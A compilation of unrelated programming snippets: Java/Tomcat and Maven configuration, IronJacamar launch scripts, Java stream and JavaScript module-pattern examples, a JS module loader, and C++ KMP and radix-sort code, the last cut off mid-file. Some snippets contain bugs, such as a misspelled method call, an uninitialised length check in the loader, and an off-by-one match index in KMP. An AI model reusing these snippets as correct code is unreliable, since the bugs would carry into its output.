			webPort = "8080";
		}

		tomcat.setPort(Integer.valueOf(webPort));

		StandardContext ctx = (StandardContext) tomcat.addWebapp("/blogleo", new File(webappDirLocation).getAbsolutePath());
		System.out.println("configuring app with basedir: " + new File(webappDirLocation).getAbsolutePath());
		
		ctx.setReloadable(true);
		// Declare an alternative location for your "WEB-INF/classes" dir
		// Servlet 3.0 annotation will work
		File additionWebInfClasses = new File("target/classes");
		WebResourceRoot resources = new StandardRoot(ctx);
		resources.addPreResources(
				new DirResourceSet(resources, "/WEB-INF/classes", additionWebInfClasses.getAbsolutePath(), "/"));
		ctx.setResources(resources);
		
		ctx.addWelcomeFile("index.html");
		tomcat.start();

		tomcat.getServer().await();
	}
}
--------------------------------------------------------------------------------------------------------
<plugin>
  <description></description>
  <groupId>org.ironjacamar</groupId>
  <artifactId>ironjacamar-validator</artifactId>
  <version>@VERSION.IRONJACAMAR@</version>
  <goalPrefix>ironjacamar</goalPrefix>
  <isolatedRealm>false</isolatedRealm>
  <inheritedByDefault>true</inheritedByDefault>
  <mojos>
    <mojo>
      <goal>validate</goal>
      <description>Validate rar package file.</description>
      <requiresDirectInvocation>false</requiresDirectInvocation>
      <requiresProject>false</requiresProject>
      <requiresReports>false</requiresReports>
      <aggregator>false</aggregator>
      <requiresOnline>false</requiresOnline>
      <inheritedByDefault>true</inheritedByDefault>
      <phase>package</phase>
      <implementation>org.ironjacamar.validator.maven.ValidatorMojo</implementation>
      <language>java</language>
      <instantiationStrategy>per-lookup</instantiationStrategy>
      <executionStrategy>once-per-session</executionStrategy>
      <parameters>
        <parameter>
          <name>outputDir</name>
          <type>java.lang.String</type>
          <required>true</required>
          <editable>true</editable>
          <description>The output directory.</description>
        </parameter>
        <parameter>
          <name>rarFile</name>
          <type>java.io.File</type>
          <required>true</required>
          <editable>true</editable>
          <description>The rar filename to be validated.</description>
        </parameter>
        <parameter>
          <name>classpath</name>
          <type>java.lang.String[]</type>
          <required>false</required>
          <editable>true</editable>
          <description>The classpath.</description>
        </parameter>
      </parameters>
    </mojo>
  </mojos>
  <dependencies>
    <groupId>org.ironjacamar</groupId>
    <artifactId>ironjacamar-validator</artifactId>
    <version>@VERSION.IRONJACAMAR@</version>
  </dependencies>
</plugin>
--------------------------------------------------------------------------------------------------------
#!/bin/sh
### ====================================================================== ###
##                                                                          ##
##  IronJacamar Script                                                      ##
##                                                                          ##
### ====================================================================== ###

### $Id: $ ###

DIRNAME=`dirname $0`

# Setup IRONJACAMAR_HOME
if [ "x$IRONJACAMAR_HOME" = "x" ]; then
    # get the full path (without any relative bits)
    IRONJACAMAR_HOME=`cd $DIRNAME/..; pwd`
fi
export IRONJACAMAR_HOME

# Setup the java endorsed dirs
IRONJACAMAR_ENDORSED_DIRS="$IRONJACAMAR_HOME/lib/endorsed"

# Setup the JVM
if [ "x$JAVA" = "x" ]; then
    if [ "x$JAVA_HOME" != "x" ]; then
        JAVA="$JAVA_HOME/bin/java"
    else
        JAVA="java"
    fi
fi

# Setup the JVM options
JAVA_OPTS="$JAVA_OPTS"

# Display the environment
echo "========================================================================="
echo ""
echo "  IronJacamar"
echo ""
echo "  IRONJACAMAR_HOME: $IRONJACAMAR_HOME"
echo ""
echo "  JAVA: $JAVA"
echo ""
echo "  JAVA_OPTS: $JAVA_OPTS"
echo ""
echo "========================================================================="
echo ""

# Start IronJacamar
"$JAVA" $JAVA_OPTS \
    -Djava.endorsed.dirs="$IRONJACAMAR_ENDORSED_DIRS" \
    -Djava.util.logging.manager=org.jboss.logmanager.LogManager \
    -Dorg.jboss.logging.Logger.pluginClass=org.jboss.logging.logmanager.LoggerPluginImpl \
    -Dlog4j.defaultInitOverride=true \
    -jar ../lib/ironjacamar-sjc.jar "$@"
	
	
@echo off
rem -------------------------------------------------------------------------
rem IronJacamar Script for Windows
rem -------------------------------------------------------------------------

rem $Id: $

@if not "%ECHO%" == ""  echo %ECHO%
@if "%OS%" == "Windows_NT" setlocal

if "%OS%" == "Windows_NT" (
  set "DIRNAME=%~dp0%"
) else (
  set DIRNAME=.\
)

pushd %DIRNAME%..
if "x%IRONJACAMAR_HOME%" == "x" (
  set "IRONJACAMAR_HOME=%CD%"
)
popd

set DIRNAME=

if "%OS%" == "Windows_NT" (
  set "PROGNAME=%~nx0%"
) else (
  set "PROGNAME=run.bat"
)

if "x%JAVA_HOME%" == "x" (
  set  JAVA=java
  echo JAVA_HOME is not set. Unexpected results may occur.
  echo Set JAVA_HOME to the directory of your local JDK to avoid this message.
) else (
  set "JAVA=%JAVA_HOME%\bin\java"
)

rem Setup IronJacamar specific properties

rem Setup the java endorsed dirs
set IRONJACAMAR_ENDORSED_DIRS=%IRONJACAMAR_HOME%\lib\endorsed

echo ===============================================================================
echo.
echo   IronJacamar
echo.
echo   IRONJACAMAR_HOME: %IRONJACAMAR_HOME%
echo.
echo   JAVA: %JAVA%
echo.
echo   JAVA_OPTS: %JAVA_OPTS%
echo.
echo ===============================================================================
echo.

:RESTART
"%JAVA%" %JAVA_OPTS% ^
   -Djava.endorsed.dirs="%IRONJACAMAR_ENDORSED_DIRS%" ^
   -Djava.util.logging.manager=org.jboss.logmanager.LogManager ^
   -Dorg.jboss.logging.Logger.pluginClass=org.jboss.logging.logmanager.LoggerPluginImpl ^
   -Dlog4j.defaultInitOverride=true ^
   -jar ..\lib\ironjacamar-sjc.jar %*

if ERRORLEVEL 10 goto RESTART

:END
if "x%NOPAUSE%" == "x" pause

:END_NO_PAUSE
--------------------------------------------------------------------------------------------------------
1. Группировка списка рабочих по их должности (деление на списки)

 Map<String, List<Worker>> map1 = workers.stream()
       .collect(Collectors.groupingBy(Worker::getPosition));


2. Группировка списка рабочих по их должности (деление на множества)

Map<String, Set<Worker>> map2 = workers.stream()
       .collect(Collectors.groupingBy(Worker::getPosition, Collectors.toSet()));


3. Подсчет количества рабочих, занимаемых конкретную должность

Map<String, Long> map3 = workers.stream()
       .collect(Collectors.groupingBy(Worker::getPosition, Collectors.counting()));


4. Группировка списка рабочих по их должности, при этом нас интересуют только имена

Map<String, Set<String>> map4 = workers.stream()
       .collect(Collectors.groupingBy(Worker::getPosition, 
              Collectors.mapping(Worker::getName, Collectors.toSet())));


5. Расчет средней зарплаты для данной должности

Map<String, Double> map5 = workers.stream()
       .collect(Collectors.groupingBy(Worker::getPosition,
              Collectors.averagingInt(Worker::getSalary)));


6. Группировка списка рабочих по их должности, рабочие представлены только именами единой строкой

Map<String, String> map6 = workers.stream()
       .collect(Collectors.groupingBy(Worker::getPosition,
              Collectors.mapping(Worker::getName, 
                     Collectors.joining(", ", "{","}")))
       );


7. Группировка списка рабочих по их должности и по возрасту.

Подсказал пользователь j2ck

Map<String, Map<Integer, List<Worker>>> collect = workers.stream()
       .collect(Collectors.groupingBy(Worker::getPosition, 
              Collectors.groupingBy(Worker::getAge)));
--------------------------------------------------------------------------------------------------------
 
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.List;
import java.util.stream.Stream;

public class ListFiles {
    public static void main(String[] args) {
      File folder = new File("G:\\Test");
      ListFiles listFiles = new ListFiles();
      System.out.println("reading files before Java8 - Using listFiles() method");
      listFiles.listAllFiles(folder);
      System.out.println("-------------------------------------------------");
      System.out.println("reading files Java8 - Using Files.walk() method");
      listFiles.listAllFiles("G:\\Test");

     }
     // Uses listFiles method  
     public void listAllFiles(File folder){
         System.out.println("In listAllfiles(File) method");
         File[] fileNames = folder.listFiles();
         for(File file : fileNames){
             // if directory call the same method again
             if(file.isDirectory()){
                 listAllFiles(file);
             }else{
                 try {
                     readContent(file);
                 } catch (IOException e) {
                     // TODO Auto-generated catch block
                     e.printStackTrace();
                 }
        
             }
         }
     }
     // Uses Files.walk method   
     public void listAllFiles(String path){
         System.out.println("In listAllfiles(String path) method");
         try(Stream<Path> paths = Files.walk(Paths.get(path))) {
             paths.forEach(filePath -> {
                 if (Files.isRegularFile(filePath)) {
                     try {
                         readContent(filePath);
                     } catch (Exception e) {
                         // TODO Auto-generated catch block
                         e.printStackTrace();
                     }
                 }
             });
         } catch (IOException e) {
             // TODO Auto-generated catch block
             e.printStackTrace();
         } 
     }
     
     public void readContent(File file) throws IOException{
         System.out.println("read file " + file.getCanonicalPath() );
         try(BufferedReader br  = new BufferedReader(new FileReader(file))){
               String strLine;
               // Read lines from the file, returns null when end of stream 
               // is reached
               while((strLine = br.readLine()) != null){
                System.out.println("Line is - " + strLine);
               }
         }
     }
     
     public void readContent(Path filePath) throws IOException{
         System.out.println("read file " + filePath);
         List<String> fileList = Files.readAllLines(filePath);
         System.out.println("" + fileList);
     }    
}
--------------------------------------------------------------------------------------------------------
<dependency>
				<groupId>org.apache.isis.core</groupId>
				<artifactId>isis</artifactId>
				<version>${isis.version}</version>
				<type>pom</type>
				<scope>import</scope>
			</dependency>

			<dependency>
				<groupId>org.apache.isis.viewer</groupId>
				<artifactId>isis-viewer-wicket</artifactId>
				<version>${isis.version}</version>
				<type>pom</type>
				<scope>import</scope>
			</dependency>
--------------------------------------------------------------------------------------------------------
Using from the command-line

Build the urm-core project with mvn clean package and grab the generated artifact urm-core.jar. Then you need the archive that will be analyzed. In this example we use abstract-factory.jar and assume the package name to be com.iluwatar.abstractfactory. Place the jar-files in the same directory and execute the following command.

java -cp abstract-factory.jar:urm-core.jar DomainMapperCli -p com.iluwatar.abstractfactory -i com.iluwatar.abstractfactory.Castle

This will scan all classes under the package com.iluwatar.abstractfactory except Castle that was marked to be ignored and output the .dot file to your console output. If you want to write it to file use switch -f filename.dot. If you need to scan multiple packages use format -p "com.package1, com.package2". Note that under Windows OS the classpath separator is ; instead of :
--------------------------------------------------------------------------------------------------------
import de.markusmo3.urm.presenters.Presenter;
import de.markusmo3.urm.presenters.Representation;
import org.apache.maven.artifact.DependencyResolutionRequiredException;
import org.apache.maven.plugin.AbstractMojo;
import org.apache.maven.plugin.MojoExecutionException;
import org.apache.maven.plugin.MojoFailureException;
import org.apache.maven.plugins.annotations.*;
import org.apache.maven.project.MavenProject;
import org.reflections.Reflections;

import java.io.File;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;

@Mojo(name = "map", defaultPhase = LifecyclePhase.PROCESS_CLASSES, requiresDependencyResolution = ResolutionScope.COMPILE)
public class DomainMapperMojo extends AbstractMojo {

    @Parameter(defaultValue = "${project.basedir}", property = "outputDir", required = true)
    private File outputDirectory;
    @Component
    private MavenProject project;
    @Parameter(property = "map.packages", required = true)
    private List<String> packages;
    @Parameter(property = "map.ignores", required = false)
    private List<String> ignores;
    @Parameter(property = "presenter", required = false)
    private String presenterString;
    @Parameter(property = "map.skipForProjects", required = false)
    private List<String> skipForProjects;

    @Override
    public void execute() throws MojoExecutionException, MojoFailureException {
        if (skipForProjects != null && !skipForProjects.isEmpty()) {
            String projectName = project.getName();
            if (skipForProjects.contains(projectName)) {
                getLog().info("Skip configured (in pom.xml) for current project \"" + projectName +"\". " +
                        "Plugin will not be executed!");
                return;
            }
        }

        if (packages.isEmpty())
            throw new MojoFailureException("No packages defined for scanning.");
        try {
            Presenter presenter = Presenter.parse(presenterString);

            String fileName = project.getName() + ".urm." + presenter.getFileEnding();
            Path path = Paths.get(outputDirectory.getPath(), fileName);

            if (!getLog().isDebugEnabled()) {
                // nullify the Reflections logger to prevent it from spamming
                // the console if we aren't in debug mode
                Reflections.log = null;
            }

            if (!Files.exists(path)) {
                List<URL> projectClasspathList = getClasspathUrls();
                DomainMapper mapper = DomainMapper.create(presenter, packages, ignores,
                        new URLClassLoader(projectClasspathList.toArray(new URL[projectClasspathList.size()])));

                Representation representation = mapper.describeDomain();
                Files.write(path, representation.getContent().getBytes());
                getLog().info(fileName + " successfully written to: \"" + path + "\"!");
            } else {
                getLog().info(fileName + " already exists, file was not overwritten!");
            }
        } catch (ClassNotFoundException | DependencyResolutionRequiredException | IOException e) {
            throw new MojoExecutionException(e.getMessage(), e);
        }
    }

    @SuppressWarnings("unchecked")
    private List<URL> getClasspathUrls() throws DependencyResolutionRequiredException, MojoExecutionException {
        List<URL> projectClasspathList = new ArrayList<>();
        for (String element : (List<String>) project.getCompileClasspathElements()) {
            try {
                projectClasspathList.add(new File(element).toURI().toURL());
            } catch (MalformedURLException e) {
                throw new MojoExecutionException(element + " is an invalid classpath element", e);
            }
        }
        return projectClasspathList;
    }
}
--------------------------------------------------------------------------------------------------------
<?xml version="1.0" encoding="UTF-8" standalone="no"?><factorypath>
    <factorypathentry enabled="true" id="M2_REPO/org/membrane-soa/service-proxy-annot/4.6.3-SNAPSHOT/service-proxy-annot-4.6.3-SNAPSHOT.jar" kind="VARJAR" runInBatchMode="false"/>
</factorypath>
--------------------------------------------------------------------------------------------------------
	public static class StreamPumpStats {
		private static ArrayList<StreamPump> pumps = new ArrayList<StreamPump>();

		public synchronized int getRunning() {
			return pumps.size();
		}
		public synchronized void registerPump(StreamPump pump) {
			pumps.add(pump);
		}
		public synchronized void unregisterPump(StreamPump pump) {
			pumps.remove(pump);
		}
		public synchronized List<StreamPump> getStreamPumps() {
			return new ArrayList<StreamPump>(pumps);
		}
		public synchronized void closeAllStreamPumps() {
			for (StreamPump p : pumps) {
				p.close();
			}
		}
	}
--------------------------------------------------------------------------------------------------------
import java.util.Map;
import java.util.concurrent.ArrayBlockingQueue;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.google.common.base.Function;
import com.predic8.membrane.core.Router;

public abstract class ScriptExecutorPool<T, R> implements Function<Map<String, Object>, R> {
	private static final Logger log = LoggerFactory.getLogger(ScriptExecutorPool.class);

	private static final int concurrency = Runtime.getRuntime().availableProcessors() * 2;
	ArrayBlockingQueue<T> scripts = new ArrayBlockingQueue<T>(concurrency);

	public void init(Router router) {
		scripts.add(createOneScript());
		router.getBackgroundInitializator().execute(new Runnable() {
			@Override
			public void run() {
				try {
					for (int i = 1; i < concurrency; i++)
						scripts.add(createOneScript());
				} catch (Exception e) {
					log.error("Error compiling script:", e);
				}
			}
		});
	}

	public final Object execute(Map<String, Object> parameters) {
		try {
			T script = scripts.take();
			try {
				return invoke(script, parameters);
			} finally {
				scripts.put(script);
			}
		} catch (InterruptedException e) {
			Thread.currentThread().interrupt();
			return null;
		}
	}

	protected abstract Object invoke(T script, Map<String, Object> parameters);
	protected abstract T createOneScript();

}
--------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.core.JsonParser;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.*;
import com.fasterxml.jackson.databind.annotation.JsonDeserialize;
import com.fasterxml.jackson.databind.annotation.JsonSerialize;
import com.predic8.membrane.core.Router;
import com.predic8.membrane.core.exchange.Exchange;
import com.predic8.membrane.core.interceptor.Interceptor;
import com.predic8.membrane.core.rules.Rule;
import com.predic8.membrane.core.rules.RuleKey;
import com.predic8.membrane.core.rules.StatisticCollector;
import com.predic8.membrane.core.stats.RuleStatisticCollector;
import com.predic8.membrane.core.transport.ssl.SSLContext;
import com.predic8.membrane.core.transport.ssl.SSLProvider;

import java.io.IOException;
import java.util.List;
import java.util.Map;

@JsonSerialize(using = FakeRule.Serializer.class)
@JsonDeserialize(using = FakeRule.Deserializer.class)
public class FakeRule implements Rule {
    private final String toStringText;
    final FakeKey key;

    public static class Serializer extends JsonSerializer<FakeRule>{
        @Override
        public void serialize(FakeRule fakeRule, JsonGenerator jsonGenerator, SerializerProvider serializerProvider) throws IOException {
            jsonGenerator.writeStartObject();
            jsonGenerator.writeStringField("name",fakeRule.toString());
            jsonGenerator.writeNumberField("port",fakeRule.getKey().getPort());
            jsonGenerator.writeEndObject();
        }
    }

    public static class Deserializer extends JsonDeserializer<FakeRule>{
        @Override
        public FakeRule deserialize(JsonParser jsonParser, DeserializationContext deserializationContext) throws IOException, JsonProcessingException {
            JsonNode node = jsonParser.getCodec().readTree(jsonParser);
            return new FakeRule(String.valueOf(node.get("name").asText()),node.get("port").asInt());
        }
    }

    public FakeRule(Rule rule) {
        this(rule.toString(),rule.getKey().getPort());
    }

    public FakeRule(String toStringText, int port) {
        this.toStringText = toStringText;
        this.key = new FakeKey(port);
    }

    @Override
    public String toString() {
        return toStringText;
    }

    @Override
    public List<Interceptor> getInterceptors() {
        return null;
    }

    @Override
    public void setInterceptors(List<Interceptor> interceptors) {

    }

    @Override
    public boolean isBlockRequest() {
        return false;
    }

    @Override
    public boolean isBlockResponse() {
        return false;
    }

    @Override
    public RuleKey getKey() {
        return key;
    }

    @Override
    public void setKey(RuleKey ruleKey) {

    }

    @Override
    public void setName(String name) {

    }

    @Override
    public String getName() {
        return null;
    }

    @Override
    public void setBlockRequest(boolean blockStatus) {

    }

    @Override
    public void setBlockResponse(boolean blockStatus) {

    }

    @Override
    public RuleStatisticCollector getStatisticCollector() {
        return null;
    }

    @Override
    public SSLContext getSslInboundContext() {
        return null;
    }

    @Override
    public SSLProvider getSslOutboundContext() {
        return null;
    }

    @Override
    public void init(Router router) throws Exception {

    }

    @Override
    public boolean isTargetAdjustHostHeader() {
        return false;
    }

    @Override
    public boolean isActive() {
        return false;
    }

    @Override
    public String getErrorState() {
        return null;
    }

    @Override
    public Rule clone() throws CloneNotSupportedException {
        return null;
    }
}
--------------------------------------------------------------------------------------------------------
class Fruit:
    def __init__(self, item):
        self.item = item


class Fruits:
    def __init__(self):
        self.items = {}

    def get_fruit(self, item):
        if item not in self.items:
            self.items[item] = Fruit(item)

        return self.items[item]


if __name__ == '__main__':
    fruits = Fruits()
    print(fruits.get_fruit('Apple'))
    print(fruits.get_fruit('Lime'))
--------------------------------------------------------------------------------------------------------
var testModule = (function () {
	
	var counter = 0;

	return {
		incrementCounter: function () {
			return counter++;
		},

		resetCounter: function () {
			console.log( "counter value prior to reset: " + counter);
			counter = 0;
		}
	};

})();

// Uso:

// Incrementando nosso contador
testModule.incrementCounter();

// Checando o valor do contador e resetando
// Saída: 1
testModule.resetCounter();


var myNamespace = (function () {
	
	var myPrivateVar, myPrivateMethod;

	// Uma variável privada contadora
	myPrivateVar = 0;

	// Uma função privada que registra qualquer argumento
	myPrivateMethod = function ( foo ) {
		console.log( foo );	
	};

	return {

		// Uma variável pública
		myPublicVar: "foo",

		// Uma função pública utilizando privadas
		myPublicFunction: function ( bar ) {

			// Incrementa nosso contador privado
			myPrivateVar++;

			// Chama nosso método privado usando bar
			myPrivateMethod( bar );
		}
	};
})();


var basketModule = (function () {
	
	// privates

	var basket = [];

	function doSomethingPrivate () {
		// ...
	}

	function doSomethingElsePrivate () {
		// ...
	}

	// Retornando um objeto exposto ao público
	return {

		// Adiciona items ao nosso carrinho
		addItem: function ( values ) {
			basket.push( values );
		},

		// Pega o número de itens na cesta
		getItemCount: function () {
			return basket.length;
		},

		// Apelido público para uma função privada
		doSomething: doSomethingPrivate,

		// Pega o valor total dos itens na cesta
		getTotal: function () {
			var q = this.getItemCount(),
				p = 0;

			while ( q-- ) {
				p += basket[q].price;
			}

			return p;
		}
	};
})();

var myModule = {
	
	myProperty: "someValue",

	// objetos literais podem conter propriedades e métodos
	// por exemplo: podemos definir um objeto adicional para o módulo de configuração:
	myConfig: {
		useCaching: true,
		language: "en"
	},

	// um método bem básico
	saySomething: function () {
		console.log( "Where in the world is Paul Irish today?" );
	},

	// retornando um valor baseado na configuração atual
	reportMyConfig: function () {
		console.log( "Caching is: " + ( this.myConfig.useCaching ? "enabled" : "disabled" ) );
	},

	// sobrescrevendo a configuração atual
	updateMyConfig: function ( newConfig ) {

		if ( typeof newConfig === "object" ) {
			this.myConfig = newConfig;
			console.log( this.myConfig.language );
		}
	}
};

// Saída: Where in the world is Paul Irish today?
myModule.saySomething();

// Saída: Caching is: enabled
myModule.reportMyConfig();

// Saída: fr
myModule.updateMyConfig({
	language: "fr",
	useCaching: false
});

// Saída: Caching is: disabled
myModule.reporMyConfig();



function Car ( model, year, miles ) {
	
	this.model = model;
	this.year = year;
	this.miles = miles;

}


// Note aqui que nós estamos usando 
// Object.prototype.method em vez de
// Object.prototype, de modo a evitar
// a redefinição do objeto prototype
Car.prototype.toString = function () {
	return this.model + " has done " + this.miles + " miles";
};

// Uso
var civic = new Car( "Honda Civic", 2009, 20000 );
var mondeo = new Car( "Ford Mondeo", 2010, 5000 );

console.log( civic.toString() );
console.log( mondeo.toString() );




// Cria um piloto de corrida de carro que herda do objeto person
var driver = Object.create( person );

// Configura algumas proprieadades para o piloto
defineProp( driver, "topSpeed", "100mph" );

// Pega uma propriedade heradada (1981)
console.log( driver.dateOfBirth );

// Pega a propriedade que nós configuramos (100mph)
console.log( driver.topSpeed );



// Abordagem compatível com ECMAScript 3

// 1. Sintaxe de Ponto

// Configura propriedades
newObject.someKey = "Hello World";

// Pega propriedade
var value = newObject.someKey;


// 2. Sintaxe de Colchete

// Configura propriedade
newObject["someKey"] = "Hello World";

// Pega propriedade
var value = newObject["someKey"];


// Abordagens compatíveis somente com ECMAScript 5
// Para mais informações veja: 
// http://kangax.github.com/es5-compat-table/

// 3. Object.defineProperty

// Configura propriedades
Object.defineProperty( newObject, "someKey", {
	value: "para mais controle do comportamento das propriedades",
	writable: true,
	enumerable: true,
	configurable: true
});

// Se o código acima parece um pouco difícil de ler, 
// uma versão mais curta pode ser escrita assim:

var defineProp = function ( obj, key, value ) {
	var config = {
		value: value,
		writable: true,
		enumerable: true,
		configurable: true
	};
	Object.defineProperty( obj, key, config );
};

// Para usar, nós então criamos um novo objeto vazio "person"
var person = Object.create( Object.prototype );

// Populando, preenchendo o objeto com propriedades
defineProp( person, "car", "Delorean" );
defineProp( person, "dateOfBirth", "1981" );
defineProp( person, "hasBeard", false );

console.log(person);
// Saída: Object {car: "Delorean", dateOfBirth: "1981", hasBeard: false}

// 4. Object.defineProperties

// Configura propriedades
Object.defineProperties( newObject, {
	"someKey": {
		value: "Hello World",
		writable: true
	},

	"anotherKey": {
		value: "Foo bar",
		writable: false
	}
});



// Cada uma das opções seguintes irão criar um novo objeto vazio:

var newObject = {};

// ou
var newObject = Object.create( Object.prototype );

// ou
var newObject = new Object();
--------------------------------------------------------------------------------------------------------
language: go
go:
  - 1.6.x
  - 1.7.x
  - 1.8.x
  - 1.9.x
  - master
script:
 - go test -v ./...
--------------------------------------------------------------------------------------------------------
/*
 * 创建闭包环境
 * 向闭包中传入模块管理对象F（~屏蔽压缩文件时，前面漏写；报错）
 */
~(function(F){
	//模块缓存器 存储已创建模块
	var moduleCache={}
})
((function(){
	//创建模块管理器对象F，并保存在全局作用域中
	return window.F={};
})());
/*
 * 创建或调用模块方法
 * @param 		url		参数为模块url
 * @param  		deps 		参数为依赖模块
 * @param		callback	参数为模块主函数
 */
F.module=function(url,modDeps,modCallback){
	//将参数转化为数组
	var args=[].slice.call(arguments),
	//获取模块构造函数（参数数组中最后一个参数成员）
	callback=args.pop(),
	//获取依赖模块(紧邻回调函数参数，且数据类型为数组)
	deps=(args.length&&args[args.length-1] instanceof Array)?args.pop():[],
	url=args.length?args.pop():null,
	params=[],
	depsCount=0,
	i=0,
	len;
	if(len==deps.length){
		while(i<len){
			//闭包保存i
			(function(i){
				depsCount++;
				//异步加载依赖模块
				loadModule(deps[i],function(mod){
					params[i]=mod;
					depsCount--;
					//如果依赖模块全部加载
					if (depsCount===0) {
						//在模块缓存器中矫正该模块，并执行构造函数
						setModule(url,params,callback);
					}
				});
			})(i);
			i++
		}
		//无依赖模块，直接执行回调函数
	}else{
		//在模块缓存器中矫正该模式，并执行构造函数
		setModule(url,[],callback);
	}
}

/*
 * 异步加载依赖模块所在文件
 * @param moduleName	模块路径（id）
 * @param callback		模块加载完成回调函数
 * 
 */
var moduleCache={},
setModule=function(moduleName,params,callback){},
loadModule=function(moduleName,callback){
	var _module;
	//如果该模块被加载过
	if(moduleCache[moduleName]){
		_module=moduleCache[moduleName];
		if (_module.status==='loaded') {
			setTimeout(callback(_module.exports),0);
		}else{
			//缓存该模块所处文件加载完成的回调函数
			_module.onload.push(callback);
		}
	}
	else{
		moduleCache[moduleName]={
			moduleName:moduleName,
			status:'loading',
			exports:null,
			onload:[callback]
		};
		loadSript(getUrl(moduleName));
	}
},
getUrl=function(){},
loadSript=function(){};

getUrl=function(moduleName){
	return string(moduleName).replace(/\.js$/g,''+'.js');
},
//加载脚本文件
loadScript=function(src){
	var _script=document.createElement('script');
	_script.type='text/javascript';
	_script.charset='UTF-8';
	_script.async=true;
	_script.src=src;
	document.getElementsByTagName('head')[0].appendChild(_script);
};
--------------------------------------------------------------------------------------------------------
	@Bean
	@Role(BeanDefinition.ROLE_INFRASTRUCTURE)
	@ConditionalOnMissingBean(Validator.class)
	public static LocalValidatorFactoryBean defaultValidator() {
		LocalValidatorFactoryBean factoryBean = new LocalValidatorFactoryBean();
		MessageInterpolatorFactory interpolatorFactory = new MessageInterpolatorFactory();
		factoryBean.setMessageInterpolator(interpolatorFactory.getObject());
		return factoryBean;
	}
--------------------------------------------------------------------------------------------------------
<project xmlns="http://maven.apache.org/POM/4.0.0"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<groupId>demo-test</groupId>
	<artifactId>demo-test</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	
	<properties>
		<downloadSources>true</downloadSources>
		<project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
                 <project.reporting.outputEncoding>UTF-8</project.reporting.outputEncoding>
                 <java.version>1.8</java.version>
		
		<version.spring.boot>2.1.3.RELEASE</version.spring.boot>
		<version.spring.cloud.starter>2.1.1.RELEASE</version.spring.cloud.starter>
		<version.junit>4.12</version.junit>
	</properties>

	<dependencies>
			<!-- ***** spring boot begin -->
			<dependency>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-starter</artifactId>
				<version>${version.spring.boot}</version>
			</dependency>
			<dependency>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-starter-web</artifactId>
				<version>${version.spring.boot}</version>
			</dependency>
			<dependency>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-starter-actuator</artifactId>
				<version>${version.spring.boot}</version>
			</dependency>
			<!-- ##### spring boot end -->
			
			<!-- ***** spring cloud begin -->
			<dependency>
				<groupId>org.springframework.cloud</groupId>
				<artifactId>spring-cloud-starter</artifactId>
				<version>${version.spring.cloud.starter}</version>
			</dependency>
			<!-- -->
			<dependency>
				<groupId>org.springframework.cloud</groupId>
				<artifactId>spring-cloud-starter-bus-amqp</artifactId>
				<version>${version.spring.cloud.starter}</version>
			</dependency> 
			
			<!-- ##### spring cloud end -->
			
			<dependency>
				<groupId>junit</groupId>
    			<artifactId>junit</artifactId>
				<scope>test</scope>
				<version>${version.junit}</version>
			</dependency>
		</dependencies>
	
</project>
--------------------------------------------------------------------------------------------------------
#include <iostream>
#include <vector>

using namespace std;

// Computes the prefix-suffix array.
vector<int> ComputePrefixFunction(string pattern){
    int m = pattern.length();
    vector<int> prefixArr(m);
    prefixArr[0] = 0;
    int k = 0;

    for(int i=1; i<m; ++i){
        while(k > 0 && pattern[k] != pattern[i]){
            k = prefixArr[k];
        }
        if(pattern[k] == pattern[i]){
            k++;
        }
        prefixArr[i] = k;
    }
    
    return prefixArr;
}

// Returns a vector of indicies where there is a pattern match.
vector<int> KMP(string text, string pattern){
    int n = text.length();
    int m = pattern.length();
    vector<int> prefixArr = ComputePrefixFunction(pattern);
    int q = 0;

    vector<int> results;

    for (int i = 0; i < n; ++i){
        while(q > 0 && pattern[q] != text[i]){
            q = prefixArr[q];
        }
        if(pattern[q] == text[i]){
            q++;
        }
        if(q == m){
            results.push_back(i-m);
            q = prefixArr[q];
        }
    }
    
    return results;
}

int main(){
    string example1 = "bacbababaabacabababaabaca";
    string pattern1 = "abaabaca";

    vector<int> result = KMP(example1, pattern1);
    vector<int>::iterator itt;
    cout << "Matches at the following indicies..." << endl;
    for(itt = result.begin(); itt != result.end(); ++itt){
        cout << *itt << endl;
    }
    return 0;
}
--------------------------------------------------------------------------------------------------------
// C++ implementation of Radix Sort 
#include<iostream> 
using namespace std; 
  
// A utility function to get maximum value in arr[] 
int getMax(int arr[], int n) 
{ 
    int mx = arr[0]; 
    for (int i = 1; i < n; i++) 
        if (arr[i] > mx) 
            mx = arr[i]; 
    return mx; 
} 
  
// A function to do counting sort of arr[] according to 
// the digit represented by exp. 
void countSort(int arr[], int n, int exp) 
{ 
    int output[n]; // output array 
    int i, count[10] = {0}; 
  
    // Store count of occurrences in count[] 
    for (i = 0; i < n; i++) 
        count[ (arr[i]/exp)%10 ]++; 
  
    // Change count[i] so that count[i] now contains actual 
    //  position of this digit in output[] 
    for (i = 1; i < 10; i++) 
        count[i] += count[i - 1]; 
  
    // Build the output array 
    for (i = n - 1; i >= 0; i--) 
    { 
        output[count[ (arr[i]/exp)%10 ] - 1] = arr[i]; 
        count[ (arr[i]/exp)%10 ]--; 
    } 
  
    // Copy the output array to arr[], so that arr[] now 
    // contains sorted numbers according to current digit 
    for (i = 0; i < n; i++) 
        arr[i] = output[i]; 
} 
  
// The main function to that sorts arr[] of size n using  
// Radix Sort 
void radixsort(int arr[], int n) 
{ 
    // Find the maximum number to know number of digits 
    int m = getMax(arr, n); 
  
    // Do counting sort for every digit. Note that instead 
    // of passing digit number, exp is passed. exp is 10^i 
    // where i is current digit number 
    for (int exp = 1; m/exp > 0; exp *= 10) 
        countSort(arr, n, exp); 
} 
  
// A utility function to print an array 
